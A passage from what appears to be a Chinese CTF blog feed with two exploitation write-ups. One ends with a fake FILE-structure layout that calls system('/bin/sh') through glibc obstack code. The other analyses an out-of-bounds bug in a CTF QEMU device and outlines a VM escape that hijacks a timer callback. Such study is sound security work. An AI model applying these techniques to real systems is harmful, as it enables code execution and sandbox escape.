class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute an aligned object_base in the new chunk */</span></span><br><span class="line">  object_base =</span><br><span class="line">    __PTR_ALIGN ((<span class="keyword">char</span> *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Move the existing object to the new chunk.</span></span><br><span class="line"><span class="comment">     Word at a time is fast and is safe if the object</span></span><br><span class="line"><span class="comment">     is sufficiently aligned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (h-&gt;alignment_mask + <span class="number">1</span> &gt;= DEFAULT_ALIGNMENT)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) - <span class="number">1</span>;</span><br><span class="line">   i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">((COPYING_UNIT *) object_base)[i]</span><br><span class="line">  = ((COPYING_UNIT *) h-&gt;object_base)[i];</span><br><span class="line">      <span class="comment">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,</span></span><br><span class="line"><span class="comment"> but that can cross a page boundary on a machine</span></span><br><span class="line"><span class="comment"> which does not do strict alignment for COPYING_UNITS.  */</span></span><br><span class="line">      already = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) * <span class="keyword">sizeof</span> (COPYING_UNIT);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    already = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Copy remaining bytes one by one.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = already; i &lt; obj_size; i++)</span><br><span class="line">    object_base[i] = h-&gt;object_base[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the object just copied was the only data in OLD_CHUNK,</span></span><br><span class="line"><span class="comment">     free that chunk and remove it from the chain.</span></span><br><span class="line"><span class="comment">     But not if that chunk might contain an empty object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!h-&gt;maybe_empty_object</span><br><span class="line">      &amp;&amp; (h-&gt;object_base</span><br><span class="line">  == __PTR_ALIGN ((<span class="keyword">char</span> *) old_chunk, old_chunk-&gt;contents,</span><br><span class="line">  h-&gt;alignment_mask)))</span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk-&gt;prev = old_chunk-&gt;prev;</span><br><span class="line">      CALL_FREEFUN (h, old_chunk);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  h-&gt;object_base = object_base;</span><br><span class="line">  h-&gt;next_free = h-&gt;object_base + obj_size;</span><br><span class="line">  <span class="comment">/* The new chunk certainly contains no empty object yet.  */</span></span><br><span class="line">  h-&gt;maybe_empty_object = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又可以看到我们熟悉的宏<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>当<code>(h)-&gt;use_extra_arg</code>不为0时即可执行到<code>(h)-&gt;chunkfun</code>。现在就是整条链子的调用了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里没有一点一点分析每个if语句应该怎么写，这里直接给出总的就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(A + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x28</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x30</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0xd8</span>) = _IO_printf_buffer_as_file_jumps;</span><br><span class="line">*(A + <span class="number">0xe0</span>) = A + <span class="number">0xe8</span>;</span><br><span class="line">*(A + <span class="number">0xe8</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf0</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf8</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x108</span>) = <span class="number">11</span>;</span><br><span class="line">*(A + <span class="number">0x110</span>) = A + <span class="number">0x110</span>;</span><br><span class="line">*(A + <span class="number">0x128</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x130</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x148</span>) = &amp;system;</span><br><span class="line">*(A + <span class="number">0x158</span>) = &amp;bin_sh;</span><br><span class="line">*(A + <span class="number">0x160</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>​    <a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd" >https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。&lt;/p&gt;
&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>QEMU逃逸练习</title>
    <link href="https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/"/>
    <id>https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/</id>
    <published>2023-03-21T07:57:03.000Z</published>
    <updated>2023-03-21T07:58:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。</p><h2 id="FastCP-ctf"><a href="#FastCP-ctf" class="headerlink" title="FastCP-ctf"></a>FastCP-ctf</h2><p>关于设备的分析可以参考前面两篇文章，这里就不再赘述了。</p><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先就是read函数这里是非常常规的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再就是write函数，可以修改<code>opaque-&gt;cp_state.cmd</code>、<code>opaque-&gt;cp_state.CP_list_cnt</code>、<code>opaque-&gt;cp_state.CP_list_src</code>，并且可以看到中间会触发timer。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// read</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// write</span></span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在timer中存在三个由cmd属性控制的分支，这里直接说三个分支的功能：</p><ol><li>  <code>opaque-&gt;cp_state.cmd = 2</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，通过<code>( cp_info.CP_cnt &lt;= 0x1000 )</code>验证之后再将<code>cp_info.CP_src</code>内容读取到<code>opaque-&gt;CP_buffer</code>上。</li><li>  <code>opaque-&gt;cp_state.cmd = 4</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，未通过任何验证，直接将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上</li><li>  <code>opaque-&gt;cp_state.cmd = 1</code>; 从<code>opaque-&gt;cp_state.CP_list_src + 8 * v9</code>读取内容到栈上，未通过任何验证，将<code>cp_info.CP_src</code>读取到<code>opaque-&gt;CP_buffer</code>上，再将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCPState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A30</span>, align=<span class="number">0x10</span>, copyof_4530)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000008F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009E0</span> cp_state CP_state ?</span><br><span class="line"><span class="number">000009F</span>8 handling db ?</span><br><span class="line"><span class="number">000009F</span>9 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>A db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>B db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>C irq_status dd ?</span><br><span class="line"><span class="number">00000</span>A00 CP_buffer db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001</span>A00 cp_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00001</span>A30 FastCPState ends</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="number">00000000</span> QEMUTimer_0 struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1181)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> expire_time dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list dq ?                         ; offset</span><br><span class="line"><span class="number">00000010</span> cb dq ?                                 ; offset</span><br><span class="line"><span class="number">00000018</span> opaque dq ?                             ; offset</span><br><span class="line"><span class="number">00000020</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000028</span> attributes dd ?</span><br><span class="line"><span class="number">0000002</span>C scale dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0 ends</span><br></pre></td></tr></table></figure><p>结合上述结构体再加上上面的分析结果漏洞已经呼之欲出了。因为情况2和3中没有对len进行验证导致可以越界使用结构体产生的漏洞。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>因为漏洞点较为简单，所以利用方式也比较简单</p><ol><li>  首先通过情况2越界读取到<code>cp_timer</code>成员中的内容。该成员中cb的值为<code>fastcp_cp_timer</code>函数的地址(在<code>pci_FastCP_realize</code>中完成赋值)，进而泄漏出system的地址。顺便泄漏出opaque成员地址。</li><li>  通过情况3越界写入内容到<code>cp_timer</code>成员，劫持cb和opaque。</li><li>  最后触发timer完成利用</li></ol><h4 id="注意！！"><a href="#注意！！" class="headerlink" 